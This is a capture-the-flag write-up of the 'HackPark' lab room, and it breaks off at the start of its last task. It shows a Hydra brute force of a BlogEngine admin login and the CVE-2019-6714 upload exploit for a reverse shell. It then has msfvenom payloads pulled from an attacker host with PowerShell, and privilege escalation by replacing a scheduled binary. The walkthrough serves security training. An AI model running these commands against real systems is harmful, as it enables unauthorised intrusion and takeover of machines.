# HackPark

Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!

# [Task 1] Deploy the vulnerable Windows machine

## Instructions

Connect to our network and deploy this machine. Please be patient as this machine can take up to 5 minutes to boot! You can test if you are connected to our network, by going to our access page. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

This room will cover brute-forcing an accounts credentials, handling public exploits, using the Metasploit framework and privilege escalation on Windows.

Deploy the machine and access its web server.

## Whats the name of the clown displayed on the homepage?

*Hint: Reverse Image Search*

Let's start with a Nmap scan:

~~~
$ nmap -sV -sC -A 10.10.79.198
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-17 07:26 CEST
Nmap scan report for 10.10.79.198
Host is up (0.047s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 6 disallowed entries 
| /Account/*.* /search /search.aspx /error404.aspx 
|_/archive /archive.aspx
|_http-server-header: Microsoft-IIS/8.5
|_http-title: hackpark | hackpark amusements
3389/tcp open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: HACKPARK
|   NetBIOS_Domain_Name: HACKPARK
|   NetBIOS_Computer_Name: HACKPARK
|   DNS_Domain_Name: hackpark
|   DNS_Computer_Name: hackpark
|   Product_Version: 6.3.9600
|_  System_Time: 2020-05-17T05:28:08+00:00
| ssl-cert: Subject: commonName=hackpark
| Not valid before: 2020-05-16T05:23:21
|_Not valid after:  2020-11-15T05:23:21
|_ssl-date: 2020-05-17T05:28:09+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 78.79 seconds
~~~

There is a web server running on port 80/tcp:

Connect to http://10.10.79.198 and download the image (http://10.10.79.198/image.axd?picture=/26572c3a-0e51-4a9f-9049-b64e730ca75d.jpg). Submit it to the Goole image search engine. It will find this: `pennywise 1990 full body`

Answer: `pennywise`

# [Task 2] Using Hydra to brute-force a login

## #2.0 - Instructions

Hydra is a parallelized, fast and flexible login cracker. If you don't have Hydra installed or need a Linux machine to use it, you can deploy a powerful Kali Linux machine and control it in your browser!

Brute-forcing can be trying every combination of a password. Dictionary-attack's are also a type of brute-forcing, where we iterating through a wordlist to obtain the password.

## #2.1

**Instructions**

We need to find a login page to attack and identify what type of request the form is making to the webserver. Typically, web servers make two types of requests, a GET request which is used to request data from a webserver and a POST request which is used to send data to a server.

You can check what request a form is making by right clicking on the login form, inspecting the element and then reading the value in the method field. You can also identify this if you are intercepting the traffic through BurpSuite (other HTTP methods can be found [here](https://www.w3schools.com/tags/ref_httpmethods.asp)).

What request type is the Windows website login form using?

**Answer**

From the menu, go to the login page (http://10.10.79.198/Account/login.aspx?ReturnURL=/admin/).

~~~
$ curl -s http://10.10.79.198/Account/login.aspx?ReturnURL=/admin/ | grep "<form"
    <form method="post" action="login.aspx?ReturnURL=%2fadmin%2f" id="Form1">
~~~

The form is using POST.

## #2.2

**Instructions**

Now we know the request type and have a URL for the login form, we can get started brute-forcing an account.

Run the following command but fill in the blanks:

~~~
hydra -l <username> -P /usr/share/wordlists/<wordlist> <ip> http-post-form
~~~

Guess a username, choose a password wordlist and gain credentials to a user account!

*Hint: Username is admin... But what is the password?*

**Answer**

Let's first intercept the POST request using Burp Suite:

~~~
POST /Account/login.aspx?ReturnURL=%2fadmin%2f HTTP/1.1
Host: 10.10.79.198
User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 777
Origin: http://10.10.79.198
DNT: 1
Connection: close
Referer: http://10.10.79.198/Account/login.aspx?ReturnURL=%2fadmin%2f
Upgrade-Insecure-Requests: 1

__VIEWSTATE=nbWrkCqQ%2B1Hn%2Fgt8OwrXb%2B%2BFMX0bVJv9xbWiO3oASE6l0%2BDl73MXEP2ao2pwbsK6Jr4MzOI9cbeVU7o5WL%2BFKDPWl1RXjt5kLGmi%2F1d9biM%2Fi3jThbmDihH1A7JWIVyWFQ3lIXAOLpqdlBKHFv6dZd8XzdjcN%2FrgmGzhog7Sf0Ml3kvolr3pzU9VlhHtBqJZNJ%2FkQVxtOT%2Bc%2FxMceQklmwd%2FeiI1sb4%2B4Mv4ol44Uy4Mf9Vaw%2B6OUiBt1BZn8PQoOcFS6ul97keSrPf2jTIqUqeC1YQwwE0FU7Syl8jfviP6nsNb4aSX6ASTDZlajXjkTtFum%2Bpk3uz4%2FtNoraPjA%2FTn5DuX56Sbr4I9oGPQznIuhjc0&__EVENTVALIDATION=pKMn8W0WIp7BuOhOq9YO49%2BqkAVDl1TJjXzk%2BDzHnOyizFWE7BYkR%2Frn983R5edqA0yBYDn%2Fi7BIxrq%2FJlxoiMHPZ2UN1iFWs83YOrgnVHxJtr4R811S4kAhpj4kb6aqZ1r9F5iqUqIoj3gfQjf%2BtO7mRTdLARthnldxPEA73U3caeMM&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=password&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in
~~~

It will help us write the paylaod for hydra. Let's crack the admin password:

~~~
$ hydra -f -l admin -P /data/src/wordlists/rockyou.txt 10.10.79.198 http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=nbWrkCqQ%2B1Hn%2Fgt8OwrXb%2B%2BFMX0bVJv9xbWiO3oASE6l0%2BDl73MXEP2ao2pwbsK6Jr4MzOI9cbeVU7o5WL%2BFKDPWl1RXjt5kLGmi%2F1d9biM%2Fi3jThbmDihH1A7JWIVyWFQ3lIXAOLpqdlBKHFv6dZd8XzdjcN%2FrgmGzhog7Sf0Ml3kvolr3pzU9VlhHtBqJZNJ%2FkQVxtOT%2Bc%2FxMceQklmwd%2FeiI1sb4%2B4Mv4ol44Uy4Mf9Vaw%2B6OUiBt1BZn8PQoOcFS6ul97keSrPf2jTIqUqeC1YQwwE0FU7Syl8jfviP6nsNb4aSX6ASTDZlajXjkTtFum%2Bpk3uz4%2FtNoraPjA%2FTn5DuX56Sbr4I9oGPQznIuhjc0&__EVENTVALIDATION=pKMn8W0WIp7BuOhOq9YO49%2BqkAVDl1TJjXzk%2BDzHnOyizFWE7BYkR%2Frn983R5edqA0yBYDn%2Fi7BIxrq%2FJlxoiMHPZ2UN1iFWs83YOrgnVHxJtr4R811S4kAhpj4kb6aqZ1r9F5iqUqIoj3gfQjf%2BtO7mRTdLARthnldxPEA73U3caeMM&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-17 14:37:09
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://10.10.79.198:80/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=nbWrkCqQ%2B1Hn%2Fgt8OwrXb%2B%2BFMX0bVJv9xbWiO3oASE6l0%2BDl73MXEP2ao2pwbsK6Jr4MzOI9cbeVU7o5WL%2BFKDPWl1RXjt5kLGmi%2F1d9biM%2Fi3jThbmDihH1A7JWIVyWFQ3lIXAOLpqdlBKHFv6dZd8XzdjcN%2FrgmGzhog7Sf0Ml3kvolr3pzU9VlhHtBqJZNJ%2FkQVxtOT%2Bc%2FxMceQklmwd%2FeiI1sb4%2B4Mv4ol44Uy4Mf9Vaw%2B6OUiBt1BZn8PQoOcFS6ul97keSrPf2jTIqUqeC1YQwwE0FU7Syl8jfviP6nsNb4aSX6ASTDZlajXjkTtFum%2Bpk3uz4%2FtNoraPjA%2FTn5DuX56Sbr4I9oGPQznIuhjc0&__EVENTVALIDATION=pKMn8W0WIp7BuOhOq9YO49%2BqkAVDl1TJjXzk%2BDzHnOyizFWE7BYkR%2Frn983R5edqA0yBYDn%2Fi7BIxrq%2FJlxoiMHPZ2UN1iFWs83YOrgnVHxJtr4R811S4kAhpj4kb6aqZ1r9F5iqUqIoj3gfQjf%2BtO7mRTdLARthnldxPEA73U3caeMM&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed
[STATUS] 944.00 tries/min, 944 tries in 00:01h, 14343454 to do in 253:15h, 16 active
[80][http-post-form] host: 10.10.79.198   login: admin   password: 1qaz2wsx
[STATUS] attack finished for 10.10.79.198 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-17 14:38:44
~~~

Great! We now have the admin password: `1qaz2wsx`.

## #2.3

**Instructions**

Hydra really does have lots of functionality, and there are many "modules" available (an example of a module would be the **http-post-form** that we used above).

However, this tool is not only good for brute-forcing HTTP forms, but other protocols such as FTP, SSH, SMTP, SMB and more. 

Below is a mini cheatsheet:

Command | Description
---|---
`hydra -P <wordlist> -v <ip> <protocol>` | Brute force against a protocol of your choice
`hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol>` | You can use Hydra to bruteforce usernames as well as passwords. It will loop through every combination in your lists. (-vV = verbose mode, showing login attempts)
`hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>` | Attack a Windows Remote Desktop with a password list.
`hydra -l <username> -P .<password list> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'` | Craft a more specific request for Hydra to brute force.

# [Task 3] Compromise the machine

## #3.0 - Instructions

In this task, you will identify and execute a public exploit (from [exploit-db.com](http://www.exploit-db.com/)) to get initial access on this Windows machine!

Exploit-Database is a CVE (common vulnerability and exposures) archive of public exploits and corresponding vulnerable software, developed for the use of penetration testers and vulnerability researches. It is owned by Offensive Security (who are responsible for OSCP and Kali)

## #3.1 Now you have logged into the website, are you able to identify the version of the BlogEngine?

Now that we are logged in as admin, click on the "About" link from the menu. Here is the information:

~~~
Your BlogEngine.NET Specification:
* Version: 3.3.6.0
* Configuration: Single blog
* Trust level: Unrestricted
* Identity: IIS APPPOOL\Blog
* Blog provider: XmlBlogProvider
* Membership provider: XmlMembershipProvider
* Role provider: XmlRoleProvider
~~~

Answer: `3.3.6.0`

## #3.2 Use the exploit database archive to find an exploit to gain a reverse shell on this system. What is the CVE?

*Hint: Look on the exploit database page.*

Googling the terms `vulnerability blogengine  3.3.6.0` leads to https://www.exploit-db.com/exploits/46353 which is about `CVE-2019-6714`.

Let's download the [exploit](https://www.exploit-db.com/raw/46353). Read and follow the instructions:

~~~
Attack:

First, we set the TcpClient address and port within the method below to 
our attack host, who has a reverse tcp listener waiting for a connection.

Next, we upload this file through the file manager.  In the current (3.3.6)
version of BlogEngine, this is done by editing a post and clicking on the 
icon that looks like an open file in the toolbar.  Note that this file must
be uploaded as PostView.ascx. Once uploaded, the file will be in the
/App_Data/files directory off of the document root. The admin page that
allows upload is:

http://10.10.10.10/admin/app/editor/editpost.cshtml

Finally, the vulnerability is triggered by accessing the base URL for the 
blog with a theme override specified like so:

http://10.10.10.10/?theme=../../App_Data/files
~~~

Let's follow the instructions:

1. Start by modifying the script so that we report the correct value for IP and port.
2. Rename your script as `PostView.ascx`
3. Go to posts (http://10.10.79.198/admin/#/content/posts) and click on "Welcome to HackPark" to edit this post
4. From the edit bar on top of the post, click on the "File Manager" icon
5. Click on the "+ UPLOAD" button and upload the `PostView.ascx` script
6. Close the file manager and click on "Save"
7. Now, open your listener (`rlwrap nc -nlvp 1234`)
8. Go to http://10.10.79.198/?theme=../../App_Data/files

Check your listener, you should now have a reverse shell.

## #3.3 Using the public exploit, gain initial access to the server. Who is the webserver running as?

~~~
$ rlwrap nc -nlvp 1234
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.79.198.
Ncat: Connection from 10.10.79.198:56475.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
whoami
c:\windows\system32\inetsrv>whoami
iis apppool\blog
~~~

# [Task 4] Windows Privilege Escalation

## #4.0 - Instructions

In this task we will learn about the basics of Windows Privilege Escalation.

First we will pivot from netcat to a meterpreter session and use this to enumerate the machine to identify potential vulnerabilities. We will then use this gathered information to exploit the system and become the Administrator.

## #4.1

**Instructions**

Our netcat session is a little unstable, so lets generate another reverse shell using msfvenom.

If you don't know how to do this, I suggest completing the Metasploit room first!

Tip: You can generate the reverse-shell payload using msfvenom, upload it using your current netcat session and execute it manually!

**Answer**

Let's generate our executable with msfvenom (make sure you select a different port as the one used for the previous reverse shell):

~~~
$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.0.54 LPORT=2345 -f exe -o revshell.exe
~~~

Now, let's download the payload from the server. To do that, we'll first start a web server (from the same location where our exe is):

~~~
$ python3 -m http.server
~~~

Now, on the reverse shell, enter the following command:

~~~
powershell -c "Invoke-WebRequest -Uri 'http://10.9.0.54:8000/revshell.exe' -OutFile 'c:\windows\temp\revshell.exe'"
~~~

Now, open `msfconsole`:

~~~
$ msfconsole -q
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 10.9.0.54
LHOST => 10.9.0.54
msf5 exploit(multi/handler) > set LPORT 2345
LPORT => 2345
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.9.0.54:2345 
~~~

Now, back to the reverse shell, let's start the executable:

~~~
c:\windows\system32\inetsrv>cd \windows\temp
dir
c:\Windows\Temp>dir
 Volume in drive C has no label.
 Volume Serial Number is 0E97-C552
 Directory of c:\Windows\Temp
05/17/2020  07:01 AM    <DIR>          .
05/17/2020  07:01 AM    <DIR>          ..
08/06/2019  02:13 PM             8,795 Amazon_SSM_Agent_20190806141239.log
08/06/2019  02:13 PM           181,468 Amazon_SSM_Agent_20190806141239_000_AmazonSSMAgentMSI.log
08/06/2019  02:13 PM             1,206 cleanup.txt
08/06/2019  02:13 PM               421 cmdout
08/06/2019  02:11 PM                 0 DMI2EBC.tmp
08/03/2019  10:43 AM                 0 DMI4D21.tmp
08/06/2019  02:12 PM             8,743 EC2ConfigService_20190806141221.log
08/06/2019  02:12 PM           292,438 EC2ConfigService_20190806141221_000_WiXEC2ConfigSetup_64.log
05/17/2020  07:01 AM            73,802 revshell.exe
08/06/2019  02:13 PM                21 stage1-complete.txt
08/06/2019  02:13 PM            28,495 stage1.txt
05/12/2019  09:03 PM           113,328 svcexec.exe
08/06/2019  02:13 PM                67 tmp.dat
              13 File(s)        708,784 bytes
               2 Dir(s)  39,143,284,736 bytes free
.\revshell.exe
c:\Windows\Temp>.\revshell.exe
~~~

In your `msfconsole`, you should now have a meterpreter:

~~~
[*] Sending stage (176195 bytes) to 10.10.79.198
[*] Meterpreter session 1 opened (10.9.0.54:2345 -> 10.10.79.198:54675) at 2020-05-17 16:05:38 +0200

meterpreter > 
~~~

## #4.2

**Instructions**

You can run metasploit commands such as sysinfo to get detailed information about the Windows system. Then feed this information into the [windows-exploit-suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester) script and quickly identify any obvious vulnerabilities.

What is the OS version of this windows machine?

**Answer**

~~~
meterpreter > sysinfo
Computer        : HACKPARK
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
~~~

Answer: `Windows 2012 R2 (6.3 Build 9600)`

## #4.3 - Further enumerate the machine. What is the name of the abnormal service running?

*Hint: Check in the "C:\Program Files (x86)" directory and go from there. Remember, you can use meterpreter to check all running processes on the machine.*

~~~
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User              Path
 ---   ----  ----                  ----  -------  ----              ----
 0     0     [System Process]                                       
 4     0     System                                                 
 360   676   svchost.exe                                            
 376   4     smss.exe                                               
 528   520   csrss.exe                                              
 580   572   csrss.exe                                              
 592   520   wininit.exe                                            
 616   572   winlogon.exe                                           
 676   592   services.exe                                           
 684   592   lsass.exe                                              
 744   676   svchost.exe                                            
 788   676   svchost.exe                                            
 820   2552  cmd.exe               x64   0        IIS APPPOOL\Blog  C:\Windows\System32\cmd.exe
 864   676   svchost.exe                                            
 884   616   dwm.exe                                                
 916   676   svchost.exe                                            
 944   676   svchost.exe                                            
 988   676   svchost.exe                                            
 1128  676   spoolsv.exe                                            
 1176  676   amazon-ssm-agent.exe                                   
 1244  676   svchost.exe                                            
 1268  676   LiteAgent.exe                                          
 1312  676   svchost.exe                                            
 1328  676   svchost.exe                                            
 1368  676   WService.exe                                           
 1476  676   msdtc.exe                                              
 1552  676   wlms.exe                                               
 1560  1368  WScheduler.exe                                         
 1576  676   Ec2Config.exe                                          
 1848  676   sppsvc.exe                                             
 2008  676   svchost.exe                                            
 2044  676   vds.exe                                                
 2316  744   WmiPrvSE.exe                                           
 2360  820   conhost.exe           x64   0        IIS APPPOOL\Blog  C:\Windows\System32\conhost.exe
 2464  2144  WScheduler.exe                                         
 2536  916   taskhostex.exe                                         
 2552  1328  w3wp.exe              x64   0        IIS APPPOOL\Blog  C:\Windows\System32\inetsrv\w3wp.exe
 2608  2600  explorer.exe                                           
 2940  820   revshell.exe          x86   0        IIS APPPOOL\Blog  c:\Windows\Temp\revshell.exe
 3060  744   SppExtComObj.Exe                                       
 3068  2584  ServerManager.exe                                      

meterpreter > 
~~~

Answer: `WindowsScheduler.exe`

## #4.4 - What is the name of the binary you're supposed to exploit? 

*Hint: have you checked for logs for the abnormal service?*

~~~
meterpreter > cd "c:\program files (x86)"
meterpreter > ls
Listing: c:\program files (x86)
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40777/rwxrwxrwx   0     dir   2013-08-22 15:36:16 +0200  Common Files
40777/rwxrwxrwx   4096  dir   2013-08-22 17:39:30 +0200  Internet Explorer
40777/rwxrwxrwx   0     dir   2013-08-22 17:39:30 +0200  Microsoft.NET
40777/rwxrwxrwx   8192  dir   2019-08-04 13:36:42 +0200  SystemScheduler
40777/rwxrwxrwx   0     dir   2019-08-06 23:12:04 +0200  Uninstall Information
40777/rwxrwxrwx   0     dir   2013-08-22 17:39:30 +0200  Windows Mail
40777/rwxrwxrwx   0     dir   2013-08-22 17:39:30 +0200  Windows NT
40777/rwxrwxrwx   0     dir   2013-08-22 17:39:30 +0200  WindowsPowerShell
100666/rw-rw-rw-  174   fil   2013-08-22 17:39:32 +0200  desktop.ini

meterpreter > cd SystemScheduler
meterpreter > ls
Listing: c:\program files (x86)\SystemScheduler
===============================================

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
40777/rwxrwxrwx   4096     dir   2019-08-04 13:36:53 +0200  Events
100666/rw-rw-rw-  60       fil   2019-08-04 13:36:42 +0200  Forum.url
100666/rw-rw-rw-  9813     fil   2019-08-04 13:36:42 +0200  License.txt
100666/rw-rw-rw-  871      fil   2019-08-04 13:37:02 +0200  LogFile.txt
100666/rw-rw-rw-  2805     fil   2019-08-04 13:36:53 +0200  LogfileAdvanced.txt
100777/rwxrwxrwx  536992   fil   2019-08-04 13:36:42 +0200  Message.exe
100777/rwxrwxrwx  445344   fil   2019-08-04 13:36:42 +0200  PlaySound.exe
100777/rwxrwxrwx  27040    fil   2019-08-04 13:36:42 +0200  PlayWAV.exe
100666/rw-rw-rw-  149      fil   2019-08-04 13:36:53 +0200  Preferences.ini
100777/rwxrwxrwx  485792   fil   2019-08-04 13:36:42 +0200  Privilege.exe
100666/rw-rw-rw-  10100    fil   2019-08-04 13:36:42 +0200  ReadMe.txt
100777/rwxrwxrwx  112544   fil   2019-08-04 13:36:42 +0200  RunNow.exe
100777/rwxrwxrwx  235936   fil   2019-08-04 13:36:42 +0200  SSAdmin.exe
100777/rwxrwxrwx  731552   fil   2019-08-04 13:36:42 +0200  SSCmd.exe
100777/rwxrwxrwx  456608   fil   2019-08-04 13:36:42 +0200  SSMail.exe
100777/rwxrwxrwx  1633696  fil   2019-08-04 13:36:42 +0200  Scheduler.exe
100777/rwxrwxrwx  491936   fil   2019-08-04 13:36:42 +0200  SendKeysHelper.exe
100777/rwxrwxrwx  437664   fil   2019-08-04 13:36:42 +0200  ShowXY.exe
100777/rwxrwxrwx  439712   fil   2019-08-04 13:36:42 +0200  ShutdownGUI.exe
100666/rw-rw-rw-  785042   fil   2019-08-04 13:36:42 +0200  WSCHEDULER.CHM
100666/rw-rw-rw-  703081   fil   2019-08-04 13:36:42 +0200  WSCHEDULER.HLP
100777/rwxrwxrwx  136096   fil   2019-08-04 13:36:42 +0200  WSCtrl.exe
100777/rwxrwxrwx  68512    fil   2019-08-04 13:36:42 +0200  WSLogon.exe
100666/rw-rw-rw-  33184    fil   2019-08-04 13:36:42 +0200  WSProc.dll
100666/rw-rw-rw-  2026     fil   2019-08-04 13:36:42 +0200  WScheduler.cnt
100777/rwxrwxrwx  331168   fil   2019-08-04 13:36:42 +0200  WScheduler.exe
100777/rwxrwxrwx  98720    fil   2019-08-04 13:36:42 +0200  WService.exe
100666/rw-rw-rw-  54       fil   2019-08-04 13:36:42 +0200  Website.url
100777/rwxrwxrwx  76704    fil   2019-08-04 13:36:42 +0200  WhoAmI.exe
100666/rw-rw-rw-  1150     fil   2019-08-04 13:36:42 +0200  alarmclock.ico
100666/rw-rw-rw-  766      fil   2019-08-04 13:36:42 +0200  clock.ico
100666/rw-rw-rw-  80856    fil   2019-08-04 13:36:42 +0200  ding.wav
100666/rw-rw-rw-  1637972  fil   2019-08-04 13:36:42 +0200  libeay32.dll
100777/rwxrwxrwx  40352    fil   2019-08-04 13:36:42 +0200  sc32.exe
100666/rw-rw-rw-  766      fil   2019-08-04 13:36:42 +0200  schedule.ico
100666/rw-rw-rw-  355446   fil   2019-08-04 13:36:42 +0200  ssleay32.dll
100666/rw-rw-rw-  6999     fil   2019-08-04 13:36:42 +0200  unins000.dat
100777/rwxrwxrwx  722597   fil   2019-08-04 13:36:42 +0200  unins000.exe
100666/rw-rw-rw-  6574     fil   2019-08-04 13:36:42 +0200  whiteclock.ico

meterpreter > cd events
meterpreter > ls
Listing: c:\program files (x86)\SystemScheduler\events
======================================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100666/rw-rw-rw-  1927   fil   2019-08-05 00:05:19 +0200  20198415519.INI
100666/rw-rw-rw-  18175  fil   2019-08-05 00:06:01 +0200  20198415519.INI_LOG.txt
100666/rw-rw-rw-  186    fil   2020-05-17 15:38:43 +0200  Administrator.flg
100666/rw-rw-rw-  182    fil   2020-05-17 15:38:18 +0200  SYSTEM_svc.flg
100666/rw-rw-rw-  0      fil   2020-05-17 15:38:43 +0200  Scheduler.flg
100666/rw-rw-rw-  449    fil   2019-08-04 13:36:53 +0200  SessionInfo.flg
100666/rw-rw-rw-  0      fil   2020-05-17 15:38:18 +0200  service.flg

meterpreter > cat 20198415519.INI_LOG.txt
08/04/19 15:06:01,Event Started Ok, (Administrator)
08/04/19 15:06:30,Process Ended. PID:2608,ExitCode:1,Message.exe (Administrator)
08/04/19 15:07:00,Event Started Ok, (Administrator)
08/04/19 15:07:34,Process Ended. PID:2680,ExitCode:4,Message.exe (Administrator)
08/04/19 15:08:00,Event Started Ok, (Administrator)
08/04/19 15:08:33,Process Ended. PID:2768,ExitCode:4,Message.exe (Administrator)
08/04/19 15:09:00,Event Started Ok, (Administrator)
08/04/19 15:09:34,Process Ended. PID:3024,ExitCode:4,Message.exe (Administrator)
08/04/19 15:10:00,Event Started Ok, (Administrator)
08/04/19 15:10:33,Process Ended. PID:1556,ExitCode:4,Message.exe (Administrator)
08/04/19 15:11:00,Event Started Ok, (Administrator)
08/04/19 15:11:33,Process Ended. PID:468,ExitCode:4,Message.exe (Administrator)
08/04/19 15:12:00,Event Started Ok, (Administrator)
08/04/19 15:12:33,Process Ended. PID:2244,ExitCode:4,Message.exe (Administrator)
08/04/19 15:13:00,Event Started Ok, (Administrator)
08/04/19 15:13:33,Process Ended. PID:1700,ExitCode:4,Message.exe (Administrator)
08/04/19 16:43:00,Event Started Ok,Can not display reminders while logged out. (SYSTEM_svc)*
08/04/19 16:44:01,Event Started Ok, (Administrator)
08/04/19 16:44:05,Process Ended. PID:2228,ExitCode:1,Message.exe (Administrator)
08/04/19 16:45:00,Event Started Ok, (Administrator)
08/04/19 16:45:20,Process Ended. PID:2640,ExitCode:1,Message.exe (Administrator)
08/04/19 16:46:00,Event Started Ok, (Administrator)
08/04/19 16:46:03,Process Ended. PID:2912,ExitCode:1,Message.exe (Administrator)
08/04/19 16:47:00,Event Started Ok, (Administrator)

...[SNIP]...

~~~

From the WindowsScheduler logs, we see that `Message.exe` is executed about every 30 seconds as administrator. We can take advantage of this to replace `Message.exe` with our reverse shell so that it is executed as adminstrator.

## #4.5 - Using this abnormal service, escalate your privileges! What is the user flag (on Jeffs Desktop)? 

*Hint: Check exploit-db.com for a public writeup of this vulnerability. The missing binary isn't the same as the public exploit.*

Unfortunately, with our meterpreter, we have insufficient privileges to read the user flag and we can't migrate to another process either:

~~~
meterpreter > cd users
meterpreter > ls
Listing: c:\users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40777/rwxrwxrwx   0     dir   2019-08-03 20:15:04 +0200  .NET v4.5
40777/rwxrwxrwx   0     dir   2019-08-03 20:15:04 +0200  .NET v4.5 Classic
40777/rwxrwxrwx   8192  dir   2019-08-03 19:43:51 +0200  Administrator
40777/rwxrwxrwx   0     dir   2013-08-22 16:48:41 +0200  All Users
40555/r-xr-xr-x   8192  dir   2013-08-22 15:36:16 +0200  Default
40777/rwxrwxrwx   0     dir   2013-08-22 16:48:41 +0200  Default User
40555/r-xr-xr-x   4096  dir   2013-08-22 15:36:16 +0200  Public
100666/rw-rw-rw-  174   fil   2013-08-22 17:39:32 +0200  desktop.ini
40777/rwxrwxrwx   0     dir   2019-08-04 20:54:52 +0200  jeff

meterpreter > cd jeff
[-] stdapi_fs_chdir: Operation failed: Access is denied.
~~~

Time to replace `C:\Program Files (x86)\SystemScheduler\Message.exe` with a reverse shell. Let's first generate new reverse shell (use a new port) that we will name `Message.exe`:

~~~
$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.0.54 LPORT=2345 -f exe -o Message.exe
$ python3 -m http.server
~~~

In Metasploit, configure the handler:

~~~
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set LHOST 10.9.0.54
LHOST => 10.9.0.54
msf5 exploit(multi/handler) > set LPORT 3456
LPORT => 3456
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.9.0.54:3456 
~~~

In the existing reverse shell, download your new reverse shell:

~~~
powershell -c "Invoke-WebRequest -Uri 'http://10.9.0.54:8000/Message.exe' -OutFile 'C:\Program Files (x86)\SystemScheduler\Message.exe'"
~~~

After some seconds, we have a meterpreter as `Administrator`:

~~~
[*] Sending stage (176195 bytes) to 10.10.79.198
[*] Meterpreter session 1 opened (10.9.0.54:3456 -> 10.10.79.198:52832) at 2020-05-17 19:19:03 +0200

meterpreter > getuid 
Server username: HACKPARK\Administrator
meterpreter > cd c:\users\jeff\desktop\
meterpreter > ls
Listing: C:\users\jeff\desktop
==============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2019-08-04 20:54:53 +0200  desktop.ini
100666/rw-rw-rw-  32    fil   2019-08-04 20:55:12 +0200  user.txt

meterpreter > cat user.txt 
759bd8af507517bcfaede78a21a73e39
~~~

## #4.6 - What is the root flag?

~~~
meterpreter > cd C:\users\administrator\desktop
meterpreter > ls
Listing: C:\users\administrator\desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  1029  fil   2019-08-04 13:36:42 +0200  System Scheduler.lnk
100666/rw-rw-rw-  282   fil   2019-08-03 19:43:54 +0200  desktop.ini
100666/rw-rw-rw-  32    fil   2019-08-04 20:48:59 +0200  root.txt

meterpreter > cat root.txt
7e13d97f05f7ceb9881a3eb3d78d3e72
~~~

# [Task 5] Privilege Escalation Without Metasploit

## #5.0 - Instructions

In this task we will escalate our privileges without the use of meterpreter/metasploit! 

Firstly, we will pivot from our netcat session that we have established, to a more stable reverse shell.

Once we have established this we will use winPEAS to enumerate the system for potential vulnerabilities, before using this information to escalate to Administrator.

## #5.1 - Now we can generate a more stable shell using msfvenom, instead of using a meterpreter, This time let's set our payload to windows/shell_reverse_tcp

Let's first download winPEAS.bat and make it available through our web server:

~~~
$ wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat
$ python -m http.server
~~~

## #5.2 - After generating our payload we need to pull this onto the box using [powershell](https://tryhackme.com/room/powershell). Tip: It's common to find C:\Windows\Temp is world writable!

In our reverse shell, we can now download WinPEAS:

~~~
